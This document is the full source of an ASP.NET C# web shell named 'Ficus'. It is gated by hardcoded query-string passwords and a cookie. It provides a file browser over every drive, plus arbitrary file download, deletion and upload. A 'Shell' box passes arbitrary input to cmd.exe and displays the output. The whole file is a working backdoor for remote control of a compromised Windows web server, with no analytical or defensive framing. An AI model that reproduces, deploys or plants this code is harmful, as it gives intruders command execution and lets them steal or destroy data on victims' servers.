<head runat="server" />
<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
	try{
	
	   string cookievalue ;
       if ( Request.Cookies["cookie"] != null )
       {
          cookievalue = Request.Cookies["cookie"].ToString();
       }
       else
       {
	   
	      string a=Request.QueryString["lnkptr"].ToString();
		  string b=Request.QueryString["pmp"].ToString();
		  if(a!="NAA@@nN"){return;}
		  if(b!="Djd7@dmc"){return;}
		  
          Response.Cookies["cookie"].Value = "NAA@@nN";
          Response.Cookies["cookie"].Expires = DateTime.Now.AddMinutes(50); 
		  
       }
	

        
		}
     catch(Exception)
    {
	 
	 return;
	 }
%>

<%
  string outstr = "";
  
  
  string dir = Page.MapPath(".") + "/";
  if (Request.QueryString["fdir"] != null)
    dir = Request.QueryString["fdir"] + "/";
  dir = dir.Replace("\\", "/");
  dir = dir.Replace("//", "/");
  
  
  string[] dirparts = dir.Split('/');
  string linkwalk = "";  
  foreach (string curpart in dirparts)
  {
    if (curpart.Length == 0)
      continue;
    linkwalk += curpart + "/";
    outstr += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;",
                  HttpUtility.UrlEncode(linkwalk),
                  HttpUtility.HtmlEncode(curpart));
  }
  lblPath.Text = outstr.Replace("/", "\\").Replace("<\\a>&nbsp;", "");
  
 
  outstr = "";
  foreach(DriveInfo curdrive in DriveInfo.GetDrives())
  {
    if (!curdrive.IsReady)
      continue;
    string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
    outstr += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;",
                  HttpUtility.UrlEncode(driveRoot),
                  HttpUtility.HtmlEncode(driveRoot));
  }
  lblDrives.Text = outstr;


  if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
  {
    Response.ClearContent();
    Response.WriteFile(Request.QueryString["get"]);
    Response.End();
  }

  
  if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
    File.Delete(Request.QueryString["del"]);  

  
  if(flUp.HasFile)
  {
    string fileName = flUp.FileName;
    int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
    if (splitAt >= 0)
      fileName = flUp.FileName.Substring(splitAt);
    flUp.SaveAs(dir + "/" + fileName);
  }

  
  DirectoryInfo di = new DirectoryInfo(dir);
  outstr = "";
  foreach (DirectoryInfo curdir in di.GetDirectories())
  {
    string fstr = string.Format("<a href='?fdir={0}'>{1}</a>",
                  HttpUtility.UrlEncode(dir + "/" + curdir.Name),
                  HttpUtility.HtmlEncode(curdir.Name));
    outstr += string.Format("<tr><td>{0}</td><td><DIR></td><td></td></tr>", fstr);
  }
  foreach (FileInfo curfile in di.GetFiles())
  {
    string fstr = string.Format("<a href='?get={0}' target='_blank'>{1}</a>",
                  HttpUtility.UrlEncode(dir + "/" + curfile.Name),
                  HttpUtility.HtmlEncode(curfile.Name));
    string astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>",
                  HttpUtility.UrlEncode(dir),
                  HttpUtility.UrlEncode(dir + "/" + curfile.Name));
    outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
  }
  lblDirOut.Text = outstr;

  
  if (txtCmdIn.Text.Length > 0)
  {
    Process p = new Process();
    p.StartInfo.CreateNoWindow = true;
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.StartInfo.WorkingDirectory = dir;
    p.Start();

    lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
    txtCmdIn.Text = "";
  }  
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
  <title>ficus</title>
  <style type="text/css">
    * { font-family: Arial; font-size: 18px; font-weight: bold;}
    body { margin: 0px; }
    pre { font-family: Courier New; background-color: #C0FFF9; }
    h1 { font-size: 16px; background-color: #00AAFF; color: #FFFAAA; padding: 5px; }
    h2 { font-size: 14px; background-color: #00AAFF; color: #FFFAAA; padding: 2px; }
    th { text-align: left; background-color: #92f3ee; }
    td { background-color: #92f3ee; }
    pre { margin: 2px; }
  </style>
</head>
<body>
  <h1>Ficus</h1>
    <form id="form1" runat="server">
    <table style="width: 100%; border-width: 0px; padding: 5px;">
    <tr>
      <td style="width: 50%; vertical-align: top;">
        <h2>Shell</h2>        
        <asp:TextBox runat="server" ID="txtCmdIn" Width="300" />
        <asp:Button runat="server" ID="cmdExec" Text="Execute" />
        <pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
      </td>
      <td style="width: 50%; vertical-align: top;">
        <h2>File Browser</h2>
        <p>
          Drives:<br />
          <asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
        </p>
        <p>
          Working directory:<br />
          <b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
        </p>
        <table style="width: 100%">
          <tr>
            <th>Name</th>
            <th>Size KB</th>
            <th style="width: 50px">Actions</th>
          </tr>
          <asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
        </table>
        <a>Upload to this directory:
        <asp:FileUpload runat="server" ID="flUp" />
        <asp:Button runat="server" ID="cmdUpload" Text="Upload" />
        </a>
      </td>
    </tr>
    </table>

    </form>
</body>
</html>